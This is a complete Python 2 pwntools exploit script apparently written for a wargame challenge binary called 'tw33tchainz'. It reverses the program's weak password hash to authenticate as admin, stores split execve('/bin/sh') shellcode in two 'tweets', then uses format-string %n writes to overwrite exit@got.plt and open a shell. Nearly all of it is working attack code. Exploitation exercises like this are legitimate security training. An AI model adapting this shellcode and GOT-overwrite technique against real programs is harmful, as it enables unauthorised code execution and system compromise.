#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /levels/project1/tw33tchainz
from pwn import *
from binascii import hexlify

# Set up pwntools for the correct architecture
exe = context.binary = ELF('/levels/project1/tw33tchainz')
context.terminal = '/bin/bash'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
source /etc/cfg/.gdbinit
continue
'''.format(**locals())

def retrieve_secret(user, salt, hash):
    user = user + '\n\0' # simulate some of the fgets fuckery
    salt = salt + '\n\0'
    user = user + '\xcc' * (16 - len(user) + 1) # add padding that hash() uses
    salt = salt + '\xba' * (16 - len(salt) + 1)
    user = user[:16] # make sure we're only keep the right number of chars
    salt = salt[:16]

    hash_arr = bytearray.fromhex(hash)

    # fix the byte order to simplify the loop
    fixed_hash = hash_arr[0:4][::-1] + hash_arr[4:8][::-1] + hash_arr[8:12][::-1] + hash_arr[12:][::-1]

    secret = bytearray(16)

    for i in range(0, 16):
        tmp = (fixed_hash[i] ^ ord(user[i])) - ord(salt[i])
        tmp &= 0xFF
        secret[i] = tmp

    return secret

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

USERNAME = "tdaddy"
SALT = "poopsmith"

EXIT_GOT_PLT_L = '\x3c\xd0\x04\x08'
EXIT_GOT_PLT_H = '\x3e\xd0\x04\x08'

SHELLCODE_CHUNK2 = '\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\xB0\x0B\x89\xE3\xCD\x80'
SHELLCODE_CHUNK1 = '\x31\xC9\xF7\xE1\x51\xbe{}\xff\xe6'


io = start()

log.info("Logging in...")
io.send(USERNAME + '\n' + SALT + '\n\n')
io.recvuntil("Generated Password:\n")

hash = io.recvline().strip()
log.info("Hash: " + hash)

secretpass = retrieve_secret(USERNAME, SALT, hash)
log.success('Recovered secretpass: {}.{}.{}.{}'.format(hexlify(secretpass[:4][::-1]), hexlify(secretpass[4:8][::-1]), hexlify(secretpass[8:12][::-1]), hexlify(secretpass[12:][::-1])))

with log.progress('Authenticating as admin') as p:
    io.send('3\n' + secretpass + '\n\n')
    if io.recvuntil("Authenticated!", timeout=.25):
        p.success("done!")
    else:
        p.failure("failed!")
        exit(1)

log.info("Enabled debug mode")
io.send('6\n\n')

with log.progress("Writing shellcode tweets") as p:
    io.send('1\n' + SHELLCODE_CHUNK2 + '\n\n')
    log.indented("Wrote first shellcode tweet")
    
    log.indented("Grabbing address of first chunk")
    io.send('2\n\n')
    io.recvuntil("Address: 0x")
    addr1 = io.recv(8).decode('hex')[::-1]
    
    io.send('1\n' + SHELLCODE_CHUNK1.format(addr1) + '\xcc' * 4 + '\n\n')
    log.indented("Wrote second shellcode tweet")
    p.success("done")

log.info("Clearing stdout")
io.clean()

with log.progress("Writing exit@got.plt overwrite tweets") as p:
    log.indented("Grabbing address of second chunk")
    io.send("2\n\n")
    io.recvuntil("Next: 0x")
    addr2 = int(io.recv(8), 16)
    addr2_l = addr2 & 0x0000ffff
    addr2_h = addr2 >> 16
    log.indented("Overwrite all of exit@got.plt")
    io.send('1\nC'+ EXIT_GOT_PLT_L + '%{}x%8$n\n\n'.format(addr2_l - 5))
    log.indented("Fix upper bytes of exit@got.plt")
    io.send('1\nB'+ EXIT_GOT_PLT_H + '%{}x%8$hn\n\n'.format(addr2_h - 5))
    p.success('done')

log.success("Exiting to spawn shell..")
io.send('5\n')

io.clean()

io.interactive()

